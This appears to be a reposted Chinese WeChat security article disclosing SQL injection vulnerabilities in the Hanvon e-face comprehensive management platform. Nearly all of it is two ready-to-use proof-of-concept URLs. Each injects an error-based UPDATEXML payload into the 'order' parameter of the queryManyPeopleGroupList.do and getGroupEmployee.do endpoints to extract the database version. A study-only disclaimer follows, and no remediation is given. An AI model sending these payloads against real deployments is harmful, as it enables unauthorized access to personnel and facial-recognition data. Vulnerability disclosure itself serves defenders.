> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzIxMTg1ODAwNw==&mid=2247500929&idx=1&sn=dee2bdaa182554616ea85ceef4775672

#  汉王e脸通综合管理平台SQL注入漏洞  
安全透视镜  网络安全透视镜   2025-07-07 13:52  
  
queryManyPeopleGroupList接口SQL注入  
  
POC:  

```
/manage/authMultiplePeople/queryManyPeopleGroupList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS4yghbW9UzIgH1zjlurthTKiaqb6ibicXZcbTrFo4sfYqG0SgeekKxTTDC8jWqibH3Bm1KbMgFSwSAkow/640?wx_fmt=png&from=appmsg "")  
  
  
getGroupEmployee  SQL注入  

```
/manage/authMultiplePeople/getGroupEmployee.do?recoToken=67mds2pxXQb&page=1&pageSize=10&groupId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS4yghbW9UzIgH1zjlurthTKQib5vmZYXlPfqr0Io6PEicergFuDtBVW09sjaU4GaZbQPwtUhn0wyFDg/640?wx_fmt=png&from=appmsg "")  
  
  
# 文章来源互联网收集整理，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS51gqsJwIM82Y5RTicXUygDUxQ76EiavrIibm8L0BUzdF6veUR4dQOKJn2iaEFQlNeq0PIPSFXTibx0OZw/640?wx_fmt=png&from=appmsg "")  
  
  
